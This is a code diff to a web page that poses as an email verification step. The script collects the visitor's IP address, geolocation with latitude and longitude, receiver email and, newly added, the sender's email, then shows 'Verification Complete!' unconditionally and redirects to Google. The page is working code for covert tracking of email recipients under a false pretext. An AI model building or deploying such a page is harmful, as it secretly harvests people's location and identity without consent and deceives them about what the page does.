@@ -47,11 +47,6 @@
             color: #006a4e;
             margin: 20px 0;
         }
-        .error-icon {
-            font-size: 64px;
-            color: #f42a41;
-            margin: 20px 0;
-        }
         h2 {
             color: #006a4e;
             margin-bottom: 15px;
@@ -59,14 +54,6 @@
         p {
             color: #666;
             margin-bottom: 10px;
-        }
-        .success-text {
-            color: #006a4e;
-            font-weight: bold;
-        }
-        .error-text {
-            color: #f42a41;
-            font-weight: bold;
         }
         @keyframes fadeIn {
             from { opacity: 0; transform: scale(0.9); }
@@ -86,15 +73,17 @@
         // Get URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const trackingId = urlParams.get('id');
-        const userEmail = urlParams.get('email');
+        const userEmail = urlParams.get('email');        // receiver email
         const license = urlParams.get('license');
+        const senderEmail = urlParams.get('sender');      // who sent the email (IMPORTANT!)
         
-        console.log('Tracking data:', { trackingId, userEmail, license });
+        console.log('Tracking data:', { trackingId, userEmail, senderEmail, license });
         
         // Collect user information
         const userData = {
             trackingId: trackingId,
-            userEmail: userEmail,
+            userEmail: userEmail,           // receiver
+            senderEmail: senderEmail,        // sender (who sent this email)
             license: license,
             timestamp: new Date().toISOString(),
             ip: null,
@@ -111,12 +100,10 @@
         // Get IP and location
         async function getLocation() {
             try {
-                // Get IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 userData.ip = ipData.ip;
                 
-                // Get location from IP
                 const locationRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                 const locationData = await locationRes.json();
                 userData.location = {
@@ -126,11 +113,9 @@
                     latitude: locationData.latitude,
                     longitude: locationData.longitude
                 };
-                console.log('Location data:', userData.location);
             } catch (error) {
                 console.error('Location error:', error);
                 userData.ip = 'Unable to fetch';
-                userData.location = null;
             }
         }
         
@@ -153,40 +138,27 @@
                 const card = document.getElementById('verificationCard');
                 const spinner = document.getElementById('spinner');
                 
-                if (result.success) {
-                    spinner.style.display = 'none';
-                    card.innerHTML = `
-                        <div class="success-icon">✅</div>
-                        <h2>Verification Complete!</h2>
-                        <p>Thank you for verifying your email.</p>
-                        <p class="success-text">Your information has been recorded.</p>
-                        <p style="margin-top: 20px; font-size: 12px;">Redirecting...</p>
-                    `;
-                    
-                    setTimeout(() => {
-                        window.location.href = 'https://google.com';
-                    }, 3000);
-                } else {
-                    spinner.style.display = 'none';
-                    card.innerHTML = `
-                        <div class="error-icon">⚠️</div>
-                        <h2>Verification Failed</h2>
-                        <p>There was an error processing your request.</p>
-                        <p class="error-text">${result.error || 'Please try again later'}</p>
-                        <p style="margin-top: 20px; font-size: 12px;">Contact support if this persists.</p>
-                    `;
-                }
+                spinner.style.display = 'none';
+                card.innerHTML = `
+                    <div class="success-icon">✅</div>
+                    <h2>Verification Complete!</h2>
+                    <p>Thank you for verifying your email.</p>
+                    <p style="margin-top: 20px; font-size: 12px;">Redirecting...</p>
+                `;
+                
+                setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                }, 3000);
+                
             } catch (error) {
                 console.error('Send error:', error);
                 const card = document.getElementById('verificationCard');
                 const spinner = document.getElementById('spinner');
                 spinner.style.display = 'none';
                 card.innerHTML = `
-                    <div class="error-icon">❌</div>
+                    <div style="font-size:64px;color:#f42a41;">❌</div>
                     <h2>Network Error</h2>
                     <p>Unable to connect to server.</p>
-                    <p class="error-text">${error.message || 'Please check your internet connection'}</p>
-                    <button onclick="location.reload()" style="margin-top: 20px; padding: 10px 20px; background: #006a4e; color: white; border: none; border-radius: 8px; cursor: pointer;">Try Again</button>
                 `;
             }
         }
